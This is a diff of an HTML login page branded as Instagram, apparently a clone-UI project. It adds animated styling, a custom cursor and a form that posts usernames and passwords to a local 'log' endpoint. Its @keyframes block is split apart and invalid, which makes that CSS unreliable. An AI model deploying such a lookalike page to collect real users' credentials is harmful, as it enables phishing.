@@ -1,77 +1,194 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fafafa;
-        }
-        .login-container {
-            width: 300px;
-            padding: 20px;
-            background: white;
-            border: 1px solid #dbdbdb;
-            text-align: center;
-            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #f9f9f9;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 10px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 3px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .login-btn:hover {
-            background: #0077cc;
-        }
-        .links {
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .links a {
-            color: #00376b;
-            text-decoration: none;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Animated Instagram Login</title>
+<style>
+* {
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+	cursor: none;
+}
+
+body {
+	font-family: Arial, sans-serif;
+	height: 100vh;
+	background: radial-gradient(circle at center, #f0f0f0 0%, #d6e4f0 100%);
+	overflow: hidden;
+	position: relative;
+}
+
+.ripple {
+	position: fixed;
+	width: 150vw;
+	height: 150vh;
+	background: radial-gradient(circle, #aee2ff 0%, transparent 80%);
+	transform: translate(-50%, -50%);
+	pointer-events: none;
+	mix-blend-mode: overlay;
+	transition: transform 0.2s ease;
+}
+
+.cursor {
+	width: 20px;
+	height: 20px;
+	border-radius: 50%;
+	background: #0095f6;
+	position: fixed;
+	pointer-events: none;
+	transform: translate(-50%, -50%);
+	z-index: 9999;
+}
+
+.login-container {
+	width: 300px;
+	padding: 30px 25px;
+	background: white;
+	border-radius: 15px;
+	box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+	text-align: center;
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%);
+	animation: floatUp 1.5s ease-out;
+}
+
+@
+keyframes floatUp { 0% {
+	transform: translate(-50%, 100%);
+	opacity: 0;
+}
+
+100
+
+
+%
+{
+transform
+
+
+:
+
+
+translate
+(
+
+
+-50
+%
+,
+-50
+%
+
+
+)
+;
+
+
+opacity
+
+
+:
+1
+;
+
+
+}
+}
+.logo {
+	font-size: 28px;
+	font-weight: bold;
+	margin-bottom: 25px;
+	color: #333;
+}
+
+input[type="text"], input[type="password"] {
+	width: 100%;
+	padding: 12px;
+	margin: 8px 0;
+	border: 1px solid #dbdbdb;
+	border-radius: 5px;
+	background: #f9f9f9;
+	transition: 0.3s;
+}
+
+input:focus {
+	border-color: #0095f6;
+	outline: none;
+	background: #fff;
+}
+
+.login-btn {
+	width: 100%;
+	padding: 12px;
+	background: #0095f6;
+	color: white;
+	border: none;
+	border-radius: 5px;
+	font-weight: bold;
+	margin-top: 15px;
+	cursor: pointer;
+	transition: 0.3s;
+}
+
+.login-btn:hover {
+	background: #0077cc;
+	transform: scale(1.05);
+}
+
+.links {
+	margin-top: 15px;
+	font-size: 14px;
+}
+
+.links a {
+	color: #00376b;
+	text-decoration: none;
+	transition: 0.3s;
+}
+
+.links a:hover {
+	text-decoration: underline;
+}
+</style>
 </head>
 <body>
 
-    <div class="login-container">
-        <div class="logo">Login  </div>
-        <form action="log" method="post">
-            <input name="uname" type="text" placeholder="Phone number, username, or email" required>
-            <input name="password" type="password" placeholder="Password" required>
-            <button class="login-btn">Log In</button>
-        </form>
-        <div class="links">
-            <p><a href="#">Forgot password?</a></p>
-            <p>Don't have an account? <a href="registration.html">Sign up</a></p>
-        </div>
-    </div>
+	<div class="ripple" id="ripple"></div>
+	<div class="cursor" id="cursor"></div>
+
+	<div class="login-container">
+		<div class="logo">Login</div>
+		<form action="log" method="post">
+			<input name="uname" type="text"
+				placeholder="Phone number, username, or email" required /> <input
+				name="password" type="password" placeholder="Password" required />
+			<button class="login-btn">Log In</button>
+		</form>
+		<div class="links">
+			<p>
+				<a href="#">Forgot password?</a>
+			</p>
+			<p>
+				Don't have an account? <a href="registration.html">Sign up</a>
+			</p>
+		</div>
+	</div>
+
+	<script>
+    const cursor = document.getElementById('cursor');
+    const ripple = document.getElementById('ripple');
+
+    document.addEventListener('mousemove', (e) => {
+      cursor.style.left = e.pageX + 'px';
+      cursor.style.top = e.pageY + 'px';
+      ripple.style.left = e.pageX + 'px';
+      ripple.style.top = e.pageY + 'px';
+    });
+  </script>
 
 </body>
 </html>
